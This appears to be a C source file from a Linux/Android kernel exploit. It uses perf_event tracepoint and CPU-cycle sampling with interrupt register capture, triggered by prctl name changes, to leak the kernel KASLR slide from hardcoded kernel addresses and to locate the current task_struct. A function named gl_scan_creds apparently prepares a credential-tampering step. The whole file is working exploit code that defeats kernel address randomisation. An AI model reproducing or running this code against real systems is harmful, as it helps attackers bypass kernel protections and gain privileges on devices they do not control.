#include "common.h"
#include "kprobe_leak.h"
#include "offsets.h"

#include <linux/hw_breakpoint.h>
#include <linux/perf_event.h>

#define GL_TASK_RENAME_ID_PATH "/sys/kernel/tracing/events/task/task_rename/id"

#define GL_SET_TASK_COMM_ENTRY 0xffffffc010555178ULL
#define GL_SET_TASK_COMM_RET 0xffffffc0105553d4ULL

#define GL_KASLR_SLIDE_MAX 0x4000000000ULL
#define GL_KASLR_SLIDE_ALIGN 0x200000ULL

#define GL_SLIDE_NAME "w3"

#define GL_REGS_INTR_MASK ((1ULL << 0) | (1ULL << 32))

#define GL_SLIDE_REC_SIZE 32
#define GL_SLIDE_PC_OFF 0x18

#define GL_BREAK_TID_OFF 0x0c

static struct gl_runtime_ids s_ids;

static int perf_take_sample(struct gl_perf_ctx *ctx, uint8_t *rec,
                            size_t rec_len, size_t min_size, int filter_tid,
                            size_t *out_size);

const struct gl_runtime_ids *gl_runtime_ids(void)
{
    return s_ids.valid ? &s_ids : NULL;
}

void gl_runtime_ids_store(const struct gl_runtime_ids *ids)
{
    if (!ids)
        return;
    s_ids = *ids;
    s_ids.valid = 1;
}

static int read_int_from_path(const char *path)
{
    char buf[0x20];
    int fd;
    ssize_t n;

    fd = open(path, O_RDONLY);
    if (fd < 0)
        return -1;

    n = read(fd, buf, sizeof(buf) - 1);
    close(fd);
    if (n < 1)
        return -1;

    buf[n] = '\0';
    buf[strcspn(buf, "\r\n \t")] = '\0';
    return atoi(buf);
}

static int perf_ring_map(struct gl_perf_ctx *ctx)
{
    struct perf_event_mmap_page *meta;
    void *ring;
    size_t page = (size_t)sysconf(_SC_PAGESIZE);

    ctx->ring_len = page * 9;
    ring = mmap(NULL, ctx->ring_len, PROT_READ | PROT_WRITE, MAP_SHARED,
                ctx->perf_fd, 0);
    if (ring == MAP_FAILED) {

        return -1;
    }

    meta = (struct perf_event_mmap_page *)ring;
    ctx->ring = ring;
    ctx->data_off = page;
    ctx->data_size = ctx->ring_len - page;
    ctx->data_head = (volatile uint64_t *)&meta->data_head;
    ctx->data_tail = (volatile uint64_t *)&meta->data_tail;
    ctx->data_base = (uint8_t *)ring + page;
    return 0;
}

int gl_perf_open(struct gl_perf_ctx *ctx, const struct gl_offsets *off,
                    pid_t pid)
{
    struct perf_event_attr attr;
    long perf_fd;
    int ev_id;

    (void)off;

    memset(ctx, 0, sizeof(*ctx));
    ctx->perf_fd = -1;
    ctx->filter_tid = -1;

    ev_id = read_int_from_path(GL_TASK_RENAME_ID_PATH);
    if (ev_id < 1) {

        return -1;
    }

    memset(&attr, 0, sizeof(attr));
    attr.type = PERF_TYPE_TRACEPOINT;
    attr.size = PERF_ATTR_SIZE_VER6;
    attr.config = (uint64_t)ev_id;
    attr.sample_period = 1;
    attr.sample_type = PERF_SAMPLE_REGS_INTR;
    attr.sample_regs_intr = GL_REGS_INTR_MASK;
    attr.disabled = 1;
    attr.wakeup_events = 1;

    errno = 0;
    perf_fd = syscall(SYS_perf_event_open, &attr, pid, -1, -1,
                      PERF_FLAG_FD_CLOEXEC);
    if (perf_fd < 0) {

        return -1;
    }
    ctx->perf_fd = (int)perf_fd;

    if (perf_ring_map(ctx) != 0)
        return -1;

    if (ioctl(ctx->perf_fd, PERF_EVENT_IOC_ENABLE, 0) != 0) {

        return -1;
    }

    return 0;
}

int gl_leak_slide(struct gl_perf_ctx *ctx, uint64_t *slide)
{
    static uint8_t rec[0x100];
    uint64_t pc, off;
    size_t n = 0;
    int rc;

    if (!ctx || !slide)
        return -1;

    errno = 0;
    rc = prctl(PR_SET_NAME, GL_SLIDE_NAME, 0, 0, 0);
    if (rc != 0)
        return -1;

    if (perf_take_sample(ctx, rec, sizeof(rec), GL_SLIDE_REC_SIZE, -1,
                         &n) != 0)
        return -1;

    pc = *(uint64_t *)(rec + GL_SLIDE_PC_OFF);

    off = pc - GL_SET_TASK_COMM_RET;
    if (pc < GL_SET_TASK_COMM_RET || off >= GL_KASLR_SLIDE_MAX)
        return -1;
    if (off % GL_KASLR_SLIDE_ALIGN != 0)
        return -1;

    *slide = off;

    return 0;
}

int gl_scan_creds(struct gl_perf_ctx *ctx, struct gl_task_pair *pair)
{
    struct gl_runtime_ids ids;

    if (!ctx || ctx->perf_fd < 0 || !pair)
        return -1;

    if (pair->task < 0xffffff8000000000ULL ||
        pair->task >= 0xffffffc000000000ULL) {

        return -1;
    }

    memset(&ids, 0, sizeof(ids));
    ids.task = pair->task;
    ids.valid = 1;

    gl_runtime_ids_store(&ids);
    return 0;
}

void gl_perf_close(struct gl_perf_ctx *ctx)
{
    if (!ctx)
        return;

    if (ctx->perf_fd >= 0)
        close(ctx->perf_fd);
    ctx->perf_fd = -1;

    if (ctx->ring && ctx->ring != MAP_FAILED)
        munmap(ctx->ring, ctx->ring_len);
    ctx->ring = NULL;
}

static int ring_copy_out(struct gl_perf_ctx *ctx, size_t off, void *dst,
                         size_t len)
{
    size_t done = 0;
    while (done < len) {
        size_t pos = (off + done) % ctx->data_size;
        size_t chunk = ctx->data_size - pos;
        if (chunk > len - done)
            chunk = len - done;
        memcpy((uint8_t *)dst + done, ctx->data_base + pos, chunk);
        done += chunk;
    }
    return 0;
}

static int perf_take_sample(struct gl_perf_ctx *ctx, uint8_t *rec,
                            size_t rec_len, size_t min_size, int filter_tid,
                            size_t *out_size)
{
    uint64_t start_ms;

    if (!ctx || !rec || !ctx->data_size || !ctx->data_base)
        return -1;

    start_ms = gl_monotonic_ms();

    for (;;) {
        uint64_t head = __atomic_load_n(ctx->data_head, __ATOMIC_ACQUIRE);
        uint64_t tail = __atomic_load_n(ctx->data_tail, __ATOMIC_ACQUIRE);

        while (tail < head) {
            uint8_t hdr[8];
            uint16_t size;

            ring_copy_out(ctx, tail % ctx->data_size, hdr, sizeof(hdr));
            size = *(uint16_t *)(hdr + 6);

            if (size < 8) {
                tail += 8;
                __atomic_store_n(ctx->data_tail, tail, __ATOMIC_RELEASE);
                continue;
            }

            if (size <= rec_len) {
                uint32_t type;

                ring_copy_out(ctx, tail % ctx->data_size, rec, size);
                type = *(uint32_t *)rec;

                if (type == PERF_RECORD_SAMPLE && size >= min_size &&
                    (filter_tid < 0 ||
                     (int)*(uint32_t *)(rec + GL_BREAK_TID_OFF) ==
                         filter_tid)) {
                    __atomic_store_n(ctx->data_tail, tail + size,
                                     __ATOMIC_RELEASE);
                    if (out_size)
                        *out_size = size;
                    return 0;
                }
            }

            tail += size;
            __atomic_store_n(ctx->data_tail, tail, __ATOMIC_RELEASE);
            head = __atomic_load_n(ctx->data_head, __ATOMIC_ACQUIRE);
        }

        if (gl_monotonic_ms() - start_ms > GL_KPROBE_TIMEOUT_MS)
            return -1;

        {
            struct pollfd pfd = {ctx->perf_fd, POLLIN, 0};
            int rc = poll(&pfd, 1, 250);
            if (rc < 0 && errno != EINTR)
                return -1;
        }
    }
}

#define GL_REGS_PROBE_MASK 0x1ffffffffULL

#define GL_REGS_PROBE_REC 288
#define GL_REGS_PROBE_REG(i) (0x18 + (size_t)(i) * 8)

#define GL_REGS_PROBE_BODY 0x280ULL
#define GL_REGS_PROBE_NAME "w4"
#define GL_REGS_PROBE_ROUNDS 50000
#define GL_REGS_PROBE_PERIOD 10000ULL

#define GL_REGS_PROBE_TSK 20
#define GL_REGS_PROBE_CUR 23

#define GL_REGS_PROBE_LO 0xffffff8000000000ULL
#define GL_REGS_PROBE_HI 0xffffffc000000000ULL

int gl_leak_task(struct gl_perf_ctx *ctx, uint64_t slide)
{
    struct perf_event_attr attr;
    struct gl_task_pair pair;
    static uint8_t rec[0x200];
    uint64_t lo, hi, pc, tsk, cur;
    pid_t self = (pid_t)gl_get_tid();
    int i, rc = -1;

    if (!ctx)
        return -1;

    lo = GL_SET_TASK_COMM_ENTRY + slide;
    hi = lo + GL_REGS_PROBE_BODY;

    memset(ctx, 0, sizeof(*ctx));
    ctx->perf_fd = -1;
    ctx->filter_tid = (int)self;

    memset(&attr, 0, sizeof(attr));
    attr.type = PERF_TYPE_HARDWARE;
    attr.size = PERF_ATTR_SIZE_VER6;
    attr.config = PERF_COUNT_HW_CPU_CYCLES;
    attr.sample_period = GL_REGS_PROBE_PERIOD;
    attr.sample_type = PERF_SAMPLE_TID | PERF_SAMPLE_REGS_INTR;
    attr.sample_regs_intr = GL_REGS_PROBE_MASK;
    attr.exclude_user = 1;
    attr.disabled = 1;
    attr.wakeup_events = 1;

    errno = 0;
    {
        long fd = syscall(SYS_perf_event_open, &attr, self, -1, -1,
                          PERF_FLAG_FD_CLOEXEC);

        if (fd < 0)
            return -1;
        ctx->perf_fd = (int)fd;
    }

    if (perf_ring_map(ctx) != 0) {
        gl_perf_close(ctx);
        return -1;
    }
    if (ioctl(ctx->perf_fd, PERF_EVENT_IOC_ENABLE, 0) != 0) {
        gl_perf_close(ctx);
        return -1;
    }

    for (i = 0; i < GL_REGS_PROBE_ROUNDS; i++) {
        size_t n = 0;

        prctl(PR_SET_NAME, GL_REGS_PROBE_NAME, 0, 0, 0);

        if (perf_take_sample(ctx, rec, sizeof(rec), GL_REGS_PROBE_REC,
                             ctx->filter_tid, &n) != 0)
            break;

        pc = *(uint64_t *)(rec + GL_REGS_PROBE_REG(32));
        tsk = *(uint64_t *)(rec + GL_REGS_PROBE_REG(GL_REGS_PROBE_TSK));
        cur = *(uint64_t *)(rec + GL_REGS_PROBE_REG(GL_REGS_PROBE_CUR));

        if (pc < lo || pc >= hi)
            continue;

        if (tsk != cur || tsk < GL_REGS_PROBE_LO || tsk >= GL_REGS_PROBE_HI)
            continue;

        ioctl(ctx->perf_fd, PERF_EVENT_IOC_DISABLE, 0);

        memset(&pair, 0, sizeof(pair));
        pair.task = tsk;
        rc = gl_scan_creds(ctx, &pair);
        break;
    }

    gl_perf_close(ctx);
    return rc;
}
